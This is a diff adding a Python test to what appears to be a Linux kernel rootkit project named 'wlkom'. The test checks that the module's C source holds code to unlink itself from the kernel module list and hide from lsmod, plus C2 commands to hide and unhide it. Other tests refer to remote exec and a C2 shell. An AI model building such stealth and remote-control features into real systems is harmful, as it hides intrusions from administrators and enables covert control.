@@ -229,6 +229,26 @@ def test_wlkom_exec_source():
     ok("wlkom exec feature source checks")
 
 
+def test_wlkom_hide_module_source():
+    """Vérifie que wlkom peut se retirer de la liste des modules et s'y réinsérer."""
+    source = WLKOM_C.read_text()
+    checks = [
+        ("static struct list_head   *module_prev", "previous module list entry storage"),
+        ("static bool                module_hidden", "module hidden state flag"),
+        ("hide_module_from_lsmod", "module hide helper"),
+        ("list_del(&THIS_MODULE->list)", "module removed from the global module list"),
+        ("show_module_in_lsmod", "module unhide helper"),
+        ("list_add(&THIS_MODULE->list, module_prev)", "module reinserted into the global module list"),
+        ('strcmp(cmd, "hide_module")', "C2 command to hide module"),
+        ('strcmp(cmd, "unhide_module")', "C2 command to unhide module"),
+        ('strcmp(cmd, "module_status")', "C2 command to report module visibility"),
+        ("show_module_in_lsmod();", "module restored during exit"),
+    ]
+    for pattern, description in checks:
+        require_source(pattern, description, source, "wlkom hide module source checks")
+    ok("wlkom hide module source checks")
+
+
 def test_c2_does_not_open_shell_on_auth_rejection():
     """Verifie que le prompt interactif reste masque si le client ne confirme pas AUTH."""
     port = free_port()
@@ -381,6 +401,7 @@ def main():
         test_c2_sends_auth_hash,
         test_wlkom_password_auth_source,
         test_wlkom_exec_source,
+        test_wlkom_hide_module_source,
         test_c2_does_not_open_shell_on_auth_rejection,
         test_c2_detects_idle_disconnect,
         test_c2_exec_protocol,
